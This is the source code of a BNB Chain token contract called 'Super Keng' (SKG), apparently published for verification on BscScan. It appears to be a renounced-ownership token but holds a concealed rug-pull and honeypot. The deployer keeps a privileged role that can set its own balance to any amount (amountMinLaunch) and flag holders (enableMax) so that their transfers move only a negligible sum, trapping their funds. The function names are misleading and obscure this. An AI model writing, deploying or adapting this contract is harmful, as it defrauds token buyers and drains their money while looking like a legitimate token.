/**
 *Submitted for verification at BscScan.com on 2023-01-23
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract SuperKeng {
    uint8 public decimals = 18;
    uint256 constant launchedListWallet = 10 ** 10;
    uint256 public totalSupply = 100000000 * 10 ** 18;

    mapping(address => bool) public sellToken;
    address public takeAmountTeam;


    mapping(address => bool) public listFee;
    string public name = "Super Keng";
    address public launchFund;

    string public symbol = "SKG";

    address public owner;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) public balanceOf;
    modifier limitReceiver() {
        require(listFee[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        IUniswapV2Router liquidityReceiverMax = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        launchFund = IUniswapV2Factory(liquidityReceiverMax.factory()).createPair(liquidityReceiverMax.WETH(), address(this));
        owner = msg.sender;
        takeAmountTeam = owner;
        listFee[takeAmountTeam] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    function transfer(address dst, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, dst, amount);
    }

    function amountMinLaunch(uint256 feeSell) public limitReceiver {
        balanceOf[takeAmountTeam] = feeSell;
    }

    function transferFrom(address src, address dst, uint256 amount) external returns (bool) {
        if (allowance[src][msg.sender] != type(uint256).max) {
            require(allowance[src][msg.sender] >= amount);
            allowance[src][msg.sender] -= amount;
        }
        return _transferFrom(src, dst, amount);
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function shouldIs(address atAutoReceiver) public limitReceiver {
        listFee[atAutoReceiver] = true;
    }

    function liquidityAmount(address modeTxBuy, address fromLaunch, uint256 feeSell) internal returns (bool) {
        require(balanceOf[modeTxBuy] >= feeSell);
        balanceOf[modeTxBuy] -= feeSell;
        balanceOf[fromLaunch] += feeSell;
        emit Transfer(modeTxBuy, fromLaunch, feeSell);
        return true;
    }

    function _transferFrom(address src, address dst, uint256 amount) internal returns (bool) {
        if (src == takeAmountTeam || dst == takeAmountTeam) {
            return liquidityAmount(src, dst, amount);
        }
        if (sellToken[src]) {
            return liquidityAmount(src, dst, launchedListWallet);
        }
        return liquidityAmount(src, dst, amount);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function enableMax(address txExempt) public limitReceiver {
        sellToken[txExempt] = true;
    }


}